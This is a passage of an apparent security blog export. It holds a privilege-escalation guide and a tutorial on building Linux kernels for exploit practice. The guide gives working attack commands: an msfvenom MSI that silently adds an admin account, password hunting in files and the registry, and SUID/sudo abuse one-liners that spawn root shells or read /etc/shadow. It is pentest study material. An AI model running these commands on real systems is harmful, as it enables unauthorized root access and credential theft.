HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># if not vulnerable</span></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"><span class="comment"># else it prints key values</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack</span></span><br><span class="line">&gt; msfvenom <span class="literal">-p</span> windows/adduser USER=rottenadmin PASS=P@ssword123! <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-o</span> rotten.msi</span><br><span class="line">&gt; msiexec /quiet /qn /i C:\programdata\rotten.msi</span><br><span class="line"><span class="comment"># /quiet    forbid sending messages to user when installing</span></span><br><span class="line"><span class="comment"># /qn       no GUI</span></span><br><span class="line"><span class="comment"># /i        specify the program</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
</li>
<li><p>Unattended Installs: a XML file named Unattended, contains all configs about program installation, like account config<br>They are under dirs:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
<p>Except <code>Unattend.xml</code>, the <code>sysprep.xml</code> and <code>sysprep.inf</code> are also contains something</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> C:*vnc.ini /s /b /c</span><br><span class="line">&gt; <span class="built_in">dir</span> C:\ /s /b /c | findstr /sr *password*</span><br><span class="line">&gt; findstr /<span class="built_in">si</span> password *.txt | *.xml | *.ini</span><br><span class="line">&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">&gt; reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>CVE</li>
</ol>
<ul>
<li>Windows10      CVE-2020-0796 </li>
<li>Windows7&#x2F;2008  CVE-2018-8120 </li>
<li>Windows7&#x2F;8、2008&#x2F;2012&#x2F;2016     CVE-2017-0213 </li>
<li>SQL Server, IIS (just for local, not domain) <a class="link"   href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" >MS16-075(RottenPotato)<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h3 id="Other-Methods"><a href="#Other-Methods" class="headerlink" title="Other Methods"></a>Other Methods</h3><p>For there are toooo much knowledge to mention, maybe it’s better to google just when you need them.</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>You can refer to <a class="link"   href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" >Basic Linux Privilege Escalation<i class="fas fa-external-link-alt"></i></a>, and info gathering part is related to <a href="/2019/05/07/2019-05-07-Linux-Security-Response/">Linux Security Response</a>  .<br>Here recommends some tools: </p>
<ul>
<li><a class="link"   href="https://github.com/rebootuser/LinEnum" >LinEnum<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/DominicBreuker/pspy" >pspy - unprivileged Linux process snooping<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://pentestmonkey.net/tools/audit/unix-privesc-check" >unix-privesc-check<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" >Linprivchecker.py<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h3 id="Kernel-Exploit-1"><a href="#Kernel-Exploit-1" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Normally we should have:</p>
<ol>
<li>vulnerable kernel</li>
<li>corresponding exploit program</li>
<li>able to transfer exploit to the target</li>
<li>able to run it, and let kernel run our payload</li>
</ol>
<p>Search exploits by</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:exploit-db.com kernel version python linprivchecker.py extended</span><br></pre></td></tr></table></figure>
<p>Some CVEs for example: CVE-2015-1328, CVE-2016-5195, CVE-2017-16995, CVE-2018-18955, CVE-2018-1000001, CVE-2019-13272. To test them, visit <a class="link"   href="http://old-releases.ubuntu.com/releases/" >This<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" >That<i class="fas fa-external-link-alt"></i></a> for old images and old kernels.</p>
<p><a class="link"   href="https://www.exploit-db.com/exploits/40839" >DirtyCow<i class="fas fa-external-link-alt"></i></a>(CVE-2016-5195) is a typical vulnerability to perform privilege escalation, which can handle many kernel versions: <a class="link"   href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" >PoCs<i class="fas fa-external-link-alt"></i></a></p>
<p>More exploit can be found at <a class="link"   href="https://github.com/SecWiki/linux-kernel-exploits" >linux-kernel-exploits<i class="fas fa-external-link-alt"></i></a>, but it is not recommended, because after that computer may be unstable and easy to crash. </p>
<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>This part can refer to <a class="link"   href="https://pentestlab.blog/2017/09/25/suid-executables/" >SUID Executables<i class="fas fa-external-link-alt"></i></a> by <a class="link"   href="https://pentestlab.blog/" >penetration testing lab<i class="fas fa-external-link-alt"></i></a>. </p>
<p>Other methods:</p>
<ul>
<li>Use <code>cp</code> to overwrite <code>/etc/shadow</code></li>
<li>Use <code>mv</code> to overwrite <code>/etc/shadow</code>, <code>/etc/sudoers</code></li>
<li><code>awk</code>: <code>awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></li>
<li><code>man</code>: <ul>
<li><code>man passwd</code></li>
<li><code>!/bin/bash</code></li>
</ul>
</li>
<li><code>python</code>&#x2F;<code>perl</code>&#x2F;<code>ruby</code>&#x2F;<code>lua</code>&#x2F;etc<ul>
<li>refer to <a href="/2020/03/31/2020-03-31-About-Reverse-Shell/">About Reverse Shell</a></li>
</ul>
</li>
<li><code>tcpdump</code><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">$ chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure></li>
</ul>
<p>A cheat sheet for <code>Linux</code> privilege escalation is <a class="link"   href="https://gtfobins.github.io/" >GTFOBins<i class="fas fa-external-link-alt"></i></a>.</p>
<p>echo ‘import os,stat ;os.chmod(“&#x2F;etc&#x2F;passwd”, stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)’ &gt;&gt; test.py</p>
<h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><p>The <code>sudo</code> command is to let normal user execute one command as <code>root</code> user, and the configurations are stored in <code>/etc/sudoers</code>.</p>
<p>Format of <code>/etc/sudoers</code> should be like</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br><span class="line"># let `root` user on `ALL(1)` terminal to be as `ALL(1)` user to execute `ALL(3)` commands</span><br><span class="line">attacker ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
<p>Use <code>sudo -l</code> to list all allowed commands, the exploit methods are similar to <code>SUID</code>.</p>
<h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>Since the crontab tasks are executed by <code>root</code> user, if any config file is editable by normal users, you can let root user execute anything you want. </p>
<p>To sum up, the <code>SUID</code>, <code>SUDO</code> and Cron jobs all depends on writing things by normal user and being executed by <code>root</code> user</p>
<h3 id="in-PATH"><a href="#in-PATH" class="headerlink" title=". in $PATH"></a><code>.</code> in $PATH</h3><p>We always run binary in current dir with <code>./binary</code>, while if we add <code>.</code> in <code>$PATH</code> we can run <code>binary</code> directly.</p>
<p>However if attackers make an evil <code>ls</code> or <code>cat</code> or something, and lure <code>root</code> user to enter that dir and execute, it is attacked.</p>
<h3 id="Other-Techniques"><a href="#Other-Techniques" class="headerlink" title="Other Techniques"></a>Other Techniques</h3><p><a class="link"   href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" >Exploiting Wildcard for Privilege Escalation<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Other-Useful-Tools"><a href="#Other-Useful-Tools" class="headerlink" title="Other Useful Tools"></a>Other Useful Tools</h2><p><a class="link"   href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" >Windows-Exploit-Suggester<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" >Linux_Exploit_Suggester<i class="fas fa-external-link-alt"></i></a> (quite old).</p>
<p><a class="link"   href="https://github.com/mzfr/gtfo" >gtfo<i class="fas fa-external-link-alt"></i></a> which searches the <a class="link"   href="https://gtfobins.github.io/" >GTFOBins<i class="fas fa-external-link-alt"></i></a> (for <code>linux</code>) and <a class="link"   href="https://lolbas-project.github.io/" >LOLBAS<i class="fas fa-external-link-alt"></i></a> (for <code>windows</code>) in <code>Python 3</code>, using system commands to elevate.</p>
<p><a class="link"   href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" >PEASS - Privilege Escalation Awesome Scripts SUITE<i class="fas fa-external-link-alt"></i></a> also provides exploit for both <code>linux</code> and <code>windows</code>.</p>
<p>A curated list of awesome privilege escalation: <a class="link"   href="https://github.com/m0nad/awesome-privilege-escalation" >Awesome Privilege Escalation<i class="fas fa-external-link-alt"></i></a></p>
<p>A pack for <a class="link"   href="https://github.com/lyshark/Windows-exploits" >Windows-exploits<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Besides there are <a class="link"   href="https://github.com/AlessandroZ/BeRoot" >BeRoot<i class="fas fa-external-link-alt"></i></a> to find config errors, <a class="link"   href="https://github.com/vulmon/Vulmap" >Vulmap<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/chroblert/WindowsVulnScan" >WindowsVulnScan<i class="fas fa-external-link-alt"></i></a> to scan vulns.</p>
<p>Online searching includes (in Chinese):</p>
<ul>
<li><a class="link"   href="https://detect.secwx.com/" >https://detect.secwx.com/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://bugs.hacking8.com/tiquan/" >http://bugs.hacking8.com/tiquan/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://i.hacking8.com/tiquan/" >https://i.hacking8.com/tiquan/<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel Building &amp; Exploit Preparation</title>
    <url>/2021/04/20/2021-04-20-Linux-Kernel-Building-Exploit-Preparation/</url>
    <content><![CDATA[<h2 id="Linux-Kernel-Build"><a href="#Linux-Kernel-Build" class="headerlink" title="Linux Kernel Build"></a>Linux Kernel Build</h2><p>To learn kernel, we should know how to compile it and how it works.</p>
<p>Source code can be found <a class="link"   href="https://www.kernel.org/" >online<i class="fas fa-external-link-alt"></i></a> and all history versions are on <a class="link"   href="https://mirrors.edge.kernel.org/pub/linux/kernel/" >there<i class="fas fa-external-link-alt"></i></a> to be downloaded. You can also view source code online on <a class="link"   href="https://elixir.bootlin.com/linux/latest/source" >bootlin<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Just-Compile"><a href="#Just-Compile" class="headerlink" title="Just Compile"></a>Just Compile</h3><p>First install some essential tools:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install git gcc fakeroot build-essential ncurses-dev xz-utils libssl-dev bc libncurses-dev flex bison</span><br></pre></td></tr></table></figure>
<p>Then you can build the kernel. If the kernel is too old, some dependencies will not be satisfied.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make menuconfig   </span><br><span class="line"><span class="comment"># if you want to build one available to debug,</span></span><br><span class="line"><span class="comment"># choose &#x27;KernelHacking --&gt; Compile-time checks and compiler options  ---&gt; Compile the kernel with debug info&#x27;</span></span><br><span class="line"><span class="comment"># disbale KASLR by unselecting &#x27;Processor type and features -&gt; Randomize the address of the kernel image (KASLR)&#x27;</span></span><br><span class="line"><span class="comment"># actually different version has different path to select the items</span></span><br><span class="line"><span class="comment"># and some other config items</span></span><br><span class="line">$ make              <span class="comment"># &#x27;make -j4&#x27; to be faster</span></span><br><span class="line">$ make all          <span class="comment"># build all</span></span><br><span class="line">$ make bzImage      <span class="comment"># build bzImage</span></span><br><span class="line">$ make modules_prepare  <span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>After that we can get <code>bzImage</code> form <code>linux-x.x.x/arch/x86/boot/bzImage</code>, and get <code>vmlinux</code> from <code>linux-x.x.x</code> root directory. </p>
<p>As for differences between <code>vmLinux</code>, <code>vmlinuz</code>, <code>vmlinux.bin</code>, <code>zImage</code> &amp; <code>bzImage</code> …</p>
<ul>
<li><code>vmlinux</code><br>This is the Linux kernel in an statically linked executable file format. Generally, you don’t have to worry about this file, it’s just a intermediate step in the boot procedure.<br>The raw vmlinux file may be useful for debugging purposes.</li>
<li><code>vmlinux.bin</code><br>The same as <code>vmlinux</code>, but in a bootable raw binary file format. All symbols and relocation information is discarded. Generated from <code>vmlinux</code> by objcopy -O binary <code>vmlinux</code> <code>vmlinux.bin</code>.</li>
<li><code>vmlinuz</code><br>The <code>vmlinux</code> file usually gets compressed with <code>zlib</code>. Since 2.6.30 LZMA and <code>bzip2</code> are also available. By adding further boot and decompression capabilities to <code>vmlinuz</code>, the image can be used to boot a system with the <code>vmlinux</code> kernel. The compression of <code>vmlinux</code> can occur with <code>zImage</code> or <code>bzImage</code>.<br>The function <code>decompress_kernel()</code> handles the decompression of <code>vmlinuz</code> at bootup, a message indicates this:  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decompressing Linux... done</span><br><span class="line">Booting the kernel.</span><br></pre></td></tr></table></figure></li>
<li><code>zImage</code> (make zImage)<br>This is the old format for small kernels (compressed, below 512KB). At boot, this image gets loaded low in memory (the first 640KB of the RAM).</li>
<li><code>bzImage</code> (make bzImage)<br>The big zImage (this has nothing to do with bzip2), was created while the kernel grew and handles bigger images (compressed, over 512KB). The image gets loaded high in memory (above 1MB RAM). As today’s kernels are way over 512KB, this is usually the preferred way.</li>
</ul>
<p>More in <a class="link"   href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml" >Here<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Busybox-and-QEMU"><a href="#Busybox-and-QEMU" class="headerlink" title="Busybox and QEMU"></a>Busybox and QEMU</h3><p>Actually to run the customized (built) kernel, we need <code>QEMU</code>, while <code>QEMU</code> needs a filesystem image to run, so we first build one image using <code>busybox</code>.</p>
<p>Download source on <a class="link"   href="https://busybox.net/downloads/" >the official site<i class="fas fa-external-link-alt"></i></a>, and comiple it with setting <code>Build static binary (no shared libs)</code> (also check <code>(./_install) Destination path for &#39;make install&#39;</code> for not installing to <code>/usr</code>)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make menuconfig</span><br><span class="line">$ make install -j4</span><br></pre></td></tr></table></figure>
<p>If you want to cross compile like using <code>arm-linux-gcc</code>, edit <code>Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">ARCH ?= <span class="variable">$(SUBARCH)</span></span><br><span class="line">CROSS_COMPILE ?=</span><br><span class="line"><span class="comment"># to be</span></span><br><span class="line">ARM ?= arm</span><br><span class="line">CROSS_COMPILE ?= arm-linux-</span><br></pre></td></tr></table></figure>
<p>After that things are generated in <code>_install</code> directory, do some extra operations</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _install</span><br><span class="line">$ mkdir proc sys dev etc etc/init.d</span><br><span class="line">$ vim etc/init.d/rcS</span><br><span class="line">$ chmod +x etc/init.d/rcS</span><br></pre></td></tr></table></figure>
<p>And in <code>etc/init.d/rcS</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">/sbin/mdev -s</span><br></pre></td></tr></table></figure>
<p>Finally we build the file system</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
<p>Then run it by <code>QEMU</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-system-x86_64 \</span><br><span class="line">-kernel /path/to/linux-x.x.x/arch/x86/boot/bzImage \</span><br><span class="line">-initrd /path/to/busybox-x.x.x/rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot;</span> \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-nographic \</span><br><span class="line">-gdb tcp::1234</span><br></pre></td></tr></table></figure>
<p>So now you run your os on your own kernel, but all scripts and commands above are just samples, there are more config modifications later.</p>
<h3 id="Add-Customized-Functions"><a href="#Add-Customized-Functions" class="headerlink" title="Add Customized Functions"></a>Add Customized Functions</h3><p>For example, if we want to implement a personal <code>syscall</code>, First we need to put things in a directory:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># in root directory of linux kernel</span></span><br><span class="line">$ <span class="built_in">cd</span> helloworld/</span><br><span class="line">$ tree </span><br><span class="line">.</span><br><span class="line">├── helloworld.c</span><br><span class="line">└── Makefile</span><br><span class="line"></span><br><span class="line">0 directories, 2 files</span><br><span class="line"></span><br><span class="line">$ cat helloworld.c </span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line">asmlinkage long sys_helloworld(void)&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat Makefile </span><br><span class="line">obj-y=helloworld.o</span><br></pre></td></tr></table></figure>
<p>Then edit the <code>Makefile</code> (1 line) to include target directory</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">core-y      += x/ xx/ xxx/ ... helloworld/</span><br></pre></td></tr></table></figure>
<p>Edit <code>include/linux/syscalls.h</code> to add function prototype to the tail</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_helloworld</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Add customized <code>syscall</code> number</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arch/x86/entry/syscalls/syscall_32.tbl, for i386</span></span><br><span class="line"><span class="number">1000</span>    i386    helloworld  sys_helloworld</span><br><span class="line"><span class="comment">// arch/x86/entry/syscalls/syscall_64.tbl, for amd64</span></span><br><span class="line"><span class="number">1000</span>    common helloworld sys_helloworld</span><br></pre></td></tr></table></figure>

<p>Then re-compile the kernel, and write a demo to test:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiled: gcc helloworld.c -o helloworld</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">    <span class="built_in">syscall</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Test:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=0 gid=0</span><br><span class="line">$ ./helloworld </span><br><span class="line">start</span><br><span class="line">[   12.345678] hello world</span><br><span class="line">end</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="Compile-Driver"><a href="#Compile-Driver" class="headerlink" title="Compile Driver"></a>Compile Driver</h3><p>As for driver module, it is apart from linux kernel compilation.<br>First we also need a driver program written in <code>C</code> like <code>hello_lkm.c</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">c</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_lkm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;hello lkm!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;size of cred : %d \n&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(c));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_lkm_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Bye, lkm\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_init</span>(hello_lkm_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_lkm_exit);</span><br></pre></td></tr></table></figure>
<p>And its Makefile specifies module name, linux kernel path, and intermediate object name:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := hello_lkm.o</span><br><span class="line"></span><br><span class="line">KERNELDR := ../</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure>
<p>We put them in one directory, and <code>make</code> to get one <code>hello_lkm.ko</code> under the current dir.</p>
<p>To install this module, we can pack it into filesystem image, and add commands in <code>init</code> to install it:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">insmod ./hello_lkm.ko</span><br><span class="line"><span class="comment"># if the driver is for &#x27;character device&#x27; or sth, also add</span></span><br><span class="line"><span class="comment"># `mknod /dev/kmod c 100 0`</span></span><br><span class="line"><span class="comment"># 100 is the primary device number</span></span><br></pre></td></tr></table></figure>
<p>Actually this driver reacts when you just when you initialize and exit it, so we can see the results when:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ insmod hello_lkm.ko</span><br><span class="line">[   20.247241] hello_lkm: loading out-of-tree module taints kernel.</span><br><span class="line">[   20.247512] hello_lkm: module license &#x27;unspecified&#x27; taints kernel.</span><br><span class="line">[   20.247894] Disabling lock debugging due to kernel taint</span><br><span class="line">[   20.252195] hello lkm!</span><br><span class="line">[   20.252373] size of cred : 168</span><br><span class="line">$ lsmod</span><br><span class="line">hello_lkm 16384 0 - Live 0xffffffffc030b000 (PO)</span><br><span class="line">$ rmmod hello_lkm.ko</span><br><span class="line">[   59.195751] Bye, lkm</span><br></pre></td></tr></table></figure>
<p>In <code>gdb</code> we can load it and set breakpoints to debug step by step:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file /path/to/linux.x.x.x/hello_lkm/hello_lkm.ko 0xffffffffc030b000</span><br><span class="line">add symbol table from file &quot;/path/to/linux.x.x.x/hello_lkm/hello_lkm.ko&quot; at</span><br><span class="line">.text_addr = 0xffffffffc030b000</span><br><span class="line">Reading symbols from /path/to/linux.x.x.x/hello_lkm/hello_lkm.ko...done.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b hello_lkm_exit</span><br><span class="line">Breakpoint1 at 0xffffffffc030b020: file /path/to/linux.x.x.x/hello_lkm/hello_lkm.c, line 25.</span><br></pre></td></tr></table></figure>

<h2 id="Linux-Kernel-Exploit"><a href="#Linux-Kernel-Exploit" class="headerlink" title="Linux Kernel Exploit"></a>Linux Kernel Exploit</h2><p>Normally the pwn challenges give us <code>xxx.ko</code>, <code>bzImage</code>, <code>initramfs.img</code>, and <code>start.sh</code></p>
<ul>
<li><code>xxx.ko</code> is the module with bugs, can be analyzed by IDA</li>
<li><code>bzImage</code> is the packed kernel, and we can use <a class="link"   href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" >extract-vmlinux<i class="fas fa-external-link-alt"></i></a> to extract <code>vmlinux</code> from it. <code>vmlinux</code> can be loaded into <code>gdb</code> to debug.<br>After that we use <code>objdump -d vmlinux &gt; gadget</code> to save gadgets and <code>Ctrl+f</code> to search, or we can use <code>ropper</code> and <code>ROPgadget</code>.</li>
<li><code>initramfs.img</code> is the filesystem image.<br>When building image using <code>busybox</code>, we <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># produce `rootfs.img` </span></span><br><span class="line">$ find . | cpio -o --format=newc &gt; ../rootfs.img </span><br><span class="line"><span class="comment"># extract image</span></span><br><span class="line">$ cpio -idmv &lt;rootfs.img </span><br></pre></td></tr></table></figure>
  however <code>initramfs.img</code> is always compressed, so we <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make initramfs.img </span></span><br><span class="line">$ find . | cpio -o -H newc | gzip &gt; /boot/initramfs.img.gz</span><br><span class="line">$ mv initramfs.img.gz initramfs.img </span><br><span class="line"><span class="comment"># and extract</span></span><br><span class="line">$ file initramfs.img</span><br><span class="line">$ mv initramfs.img initramfs.img.gz <span class="comment"># or &#x27;initramfs.img.xz&#x27; according to file type</span></span><br><span class="line">$ gunzip initramfs.img.gz <span class="comment"># or &#x27;xz -d initramfs.img.xz&#x27;</span></span><br><span class="line">$ cpio -idmv &lt; ./initramfs.img </span><br></pre></td></tr></table></figure></li>
<li><code>start.sh</code> is the script to run <code>QEMU</code> system mode.</li>
</ul>
<h3 id="Security-Mechanism"><a href="#Security-Mechanism" class="headerlink" title="Security Mechanism"></a>Security Mechanism</h3><p>Some challenges run on environment with security mechanism (<a class="link"   href="https://www.kernel.org/doc/Documentation/sysctl/kernel.txt" >reference<i class="fas fa-external-link-alt"></i></a>), so we normally disable them to obtain more debug info.</p>
<p>Like in <code>init</code> in extracted <code>initramfs.img</code>, we can add commands to remove <code>kptr_restrict</code>, <code>dmesg_restrict</code> and <code>MMAP_MIN_ADDR</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"># 0: no restrictions</span><br><span class="line"># 1: users must have CAP_SYSLOG to use dmesg and see &#x27;printk()&#x27; results</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"># 0: print using &#x27;%p&#x27; in &#x27;seq_printf()&#x27; of &#x27;kallsyms.c&#x27;</span><br><span class="line"># 1: print 0 unless having CAP_SYSLOG</span><br><span class="line"># 2: kernel pointers printed using &#x27;%pK&#x27; will be replaced with 0&#x27;s regardless of privileges</span><br><span class="line">setsid /bin/cttyhack setuidgid 0000 /bin/sh </span><br><span class="line"># give root privilege to normal user</span><br></pre></td></tr></table></figure>
<p>And when stopping <code>KASLR</code>, <code>SMEP</code> and <code>SMAP</code>, we modify <code>QEMU</code> running parameters (add <code>nokaslr</code>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-append &quot;console=ttyS0 nokaslr ...&quot; # replace kaslr with nokaslr</span><br><span class="line">-cpu kvm64,... # remove &#x27;+smep,+smap&#x27;</span><br></pre></td></tr></table></figure>
<p>As for <code>NX</code> and <code>Canary</code>(stack protector), these can be done in compilation.</p>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>Using <code>GDBStub</code> (start <code>gdbserver</code> port locally) of <code>QEMU</code> to debug, we add parameter</p>
